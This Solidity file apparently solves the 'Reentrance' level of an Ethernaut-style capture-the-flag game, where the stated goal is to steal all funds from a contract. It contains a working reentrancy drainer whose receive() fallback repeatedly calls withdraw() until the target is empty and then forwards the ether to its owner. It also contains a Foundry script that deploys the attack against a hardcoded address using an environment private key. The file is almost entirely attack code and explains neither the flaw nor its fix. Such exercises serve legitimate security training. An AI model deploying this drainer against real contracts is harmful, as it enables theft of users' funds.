/*
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.
See the "?" page above, section "Beyond the console"


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "src/Reentrance.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ReentrancyAttack {
    Reentrance public reentrance;
    address payable public owner;
    uint256 public initialDeposit;

    constructor(Reentrance _reentrance) public {
        reentrance = _reentrance;
        owner = payable(msg.sender);
    }

    function attack() public payable {
        initialDeposit = msg.value;
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance > 0) {
            uint256 withdrawAmount = initialDeposit;
            if (targetBalance < withdrawAmount) {
                withdrawAmount = targetBalance;
            }
            reentrance.withdraw(withdrawAmount);
        } else {
            owner.transfer(address(this).balance);
        }
    }
}

contract ReentranceSolution is Script {
    Reentrance public reentrance = Reentrance(payable(0xaDf45F640D1fD0a355d418D0Aa48ceD90Dc72de9));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentrancyAttack attack = new ReentrancyAttack(reentrance);
        console.log("Initial target contract balance:", address(reentrance).balance);
        console.log("Initial attacker balance:", address(attack).balance);
        console.log("Initial owner balance:", address(vm.envAddress("MY_ADDRESS")).balance);
        attack.attack{value: 100000000000000 wei}();
        console.log("After attack target contract balance:", address(reentrance).balance);
        console.log("After attack, attacker balance:", address(attack).balance);
        console.log("After attack owner balance:", address(vm.envAddress("MY_ADDRESS")).balance);
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
